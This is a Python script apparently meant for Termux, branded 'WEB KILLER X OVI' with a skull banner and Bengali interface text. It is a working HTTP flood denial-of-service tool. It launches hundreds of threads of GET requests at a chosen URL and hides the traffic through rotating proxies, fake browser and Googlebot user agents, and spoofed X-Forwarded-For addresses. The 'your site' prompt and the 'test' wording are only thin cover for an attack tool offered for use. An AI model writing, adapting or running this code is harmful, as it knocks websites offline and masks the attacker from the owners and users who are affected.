#!/data/data/com.termux/files/usr/bin/python3

import requests
import threading
import random
import time
import sys
import os
from urllib.parse import urlparse

# রং ডিফাইন
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
RESET = "\033[0m"

# ========== স্কাল লোগো ==========
BANNER = f"""
{R}                 ______
              .-"      "-.
             /            \\
            |              |
            |,  .-.  .-.  ,|
            | )(___)(___)( |
            |/     ' '     \\
             \_   ____   _/
               \________/
             ___|_|__|_|___
            /              \\

        [☠] WEB KILLER X OVI [☠]{RESET}
"""

# SSL সতর্কতা বন্ধ
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebKillerX:
    def __init__(self, target, threads, duration, proxy_file=None):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.proxy_file = proxy_file
        self.running = True
        self.sent = 0
        self.failed = 0
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.proxies = []
        
        if proxy_file:
            self.load_proxies()
    
    def load_proxies(self):
        try:
            with open(self.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"{G}[✓] {len(self.proxies)} টি প্রক্সি লোড করা হয়েছে{RESET}")
        except Exception as e:
            print(f"{R}[!] প্রক্সি ফাইল পড়তে সমস্যা: {e}{RESET}")
            self.proxies = []
    
    def get_random_proxy(self):
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
    
    def random_headers(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        ]
        referers = [
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/",
            self.target
        ]
        return {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "bn-BD,bn;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": random.choice(referers),
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
    
    def attack(self):
        while self.running:
            try:
                headers = self.random_headers()
                proxies = self.get_random_proxy() if self.proxies else None
                r = self.session.get(self.target, headers=headers, proxies=proxies, timeout=5, verify=False)
                with self.lock:
                    self.sent += 1
                    if r.status_code == 200:
                        sys.stdout.write(f"{G}•{RESET}")
                    else:
                        sys.stdout.write(f"{Y}?{RESET}")
            except Exception:
                with self.lock:
                    self.failed += 1
                    sys.stdout.write(f"{R}x{RESET}")
            sys.stdout.flush()
    
    def start(self):
        os.system("clear" if os.name == "posix" else "cls")
        print(BANNER)
        print(f"{C}[+] টার্গেট:{RESET} {self.target}")
        print(f"{C}[+] থ্রেড:{RESET} {self.threads}")
        print(f"{C}[+] সময়:{RESET} {self.duration} সেকেন্ড")
        if self.proxies:
            print(f"{C}[+] প্রক্সি ব্যবহার:{RESET} হ্যাঁ ({len(self.proxies)} টি)")
        else:
            print(f"{C}[+] প্রক্সি ব্যবহার:{RESET} না")
        print()
        print(f"{Y}[!] টেস্ট শুরু হচ্ছে... Ctrl+C বন্ধ করতে{RESET}\n")
        
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack)
            t.daemon = True
            t.start()
        
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                print(f"\r⏱️  সময়: {elapsed}/{self.duration} | 📤 পাঠানো: {self.sent} | ❌ ব্যর্থ: {self.failed}", end="")
        except KeyboardInterrupt:
            print(f"\n{R}[!] ব্যবহারকারী কর্তৃক বন্ধ করা হয়েছে{RESET}")
        finally:
            self.running = False
            time.sleep(1)
            print(f"\n\n{G}[✓] টেস্ট সম্পন্ন!{RESET}")
            print(f"{G}📊 মোট পাঠানো: {self.sent}{RESET}")
            print(f"{R}❌ মোট ব্যর্থ: {self.failed}{RESET}")
            if (self.sent + self.failed) > 0:
                success_rate = (self.sent / (self.sent + self.failed)) * 100
                print(f"{C}📈 সাফল্যের হার: {success_rate:.2f}%{RESET}")

def main():
    os.system("clear" if os.name == "posix" else "cls")
    print(BANNER)
    try:
        target = input(f"{Y}Target URL (your site): {RESET}").strip()
        if not target.startswith("http"):
            target = "http://" + target
        threads = int(input(f"{Y}থ্রেড সংখ্যা (যেমন 200): {RESET}"))
        duration = int(input(f"{Y}সময় (সেকেন্ড, যেমন 60): {RESET}"))
        use_proxy = input(f"{Y}প্রক্সি ব্যবহার করবেন? (y/n): {RESET}").lower().strip()
        proxy_file = None
        if use_proxy == 'y':
            proxy_file = input(f"{Y}প্রক্সি ফাইলের নাম (যেমন proxy.txt): {RESET}").strip()
        tester = WebKillerX(target, threads, duration, proxy_file)
        tester.start()
    except KeyboardInterrupt:
        print(f"\n{R}প্রোগ্রাম বন্ধ করা হয়েছে{RESET}")
    except Exception as e:
        print(f"{R}ত্রুটি: {e}{RESET}")

if __name__ == "__main__":
    main()
